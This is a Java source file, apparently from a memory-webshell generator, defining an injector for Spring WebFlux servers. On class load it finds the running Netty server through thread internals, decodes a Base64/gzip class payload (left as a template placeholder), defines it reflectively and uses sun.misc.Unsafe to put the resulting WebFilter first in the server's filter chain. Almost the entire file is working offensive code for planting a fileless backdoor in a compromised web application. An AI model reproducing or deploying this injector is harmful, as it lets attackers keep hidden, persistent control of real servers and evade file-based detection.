package com.reajason.javaweb.memshell.springwebflux.injector;

import org.springframework.util.Base64Utils;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.handler.DefaultWebFilterChain;
import org.springframework.web.server.handler.FilteringWebHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/24
 */
public class SpringWebFluxWebFilterInjector {

    static {
        new SpringWebFluxWebFilterInjector();
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public SpringWebFluxWebFilterInjector() {
        try {
            FilteringWebHandler webHandler = getWebHandler();
            Object filter = getShell();
            inject(webHandler, filter);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public FilteringWebHandler getWebHandler() throws Exception {
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getClass().getName().contains("NettyWebServer")) {
                Object nettyWebServer = getFieldValue(thread, "this$0");
                Object reactorHttpHandlerAdapter = getFieldValue(nettyWebServer, "handler");
                Object httpHandler = getFieldValue(reactorHttpHandlerAdapter, "httpHandler");
                return (FilteringWebHandler) getFieldValue(getFieldValue(getFieldValue(httpHandler, "delegate"), "delegate"), "delegate");
            }
        }
        return null;
    }

    private Object getShell() throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Object interceptor = null;
        try {
            interceptor = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(Base64Utils.decodeFromString(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            interceptor = clazz.newInstance();
        }
        return interceptor;
    }

    public void inject(FilteringWebHandler webHandler, Object filter) throws Exception {
        DefaultWebFilterChain chain = (DefaultWebFilterChain) getFieldValue(webHandler, "chain");
        List<WebFilter> filters = new ArrayList<>(chain.getFilters());
        for (Object o : filters) {
            if (o.getClass().getName().equals(getClassName())) {
                System.out.println("filter already injected");
                return;
            }
        }
        filters.add(0, ((WebFilter) filter));
        DefaultWebFilterChain newChain = new DefaultWebFilterChain(chain.getHandler(), filters);
        setFinalField(webHandler, "chain", newChain);
        System.out.println("filter inject successful");
    }

    public void setFinalField(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        Object unsafe = unsafeField.get(null);
        Object offset = unsafe.getClass().getMethod("objectFieldOffset", Field.class).invoke(unsafe, field);
        unsafe.getClass().getMethod("putObject", Object.class, long.class, Object.class).invoke(unsafe, obj, offset, value);
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        try (ByteArrayOutputStream out = new ByteArrayOutputStream();
             GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData))) {
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }
}
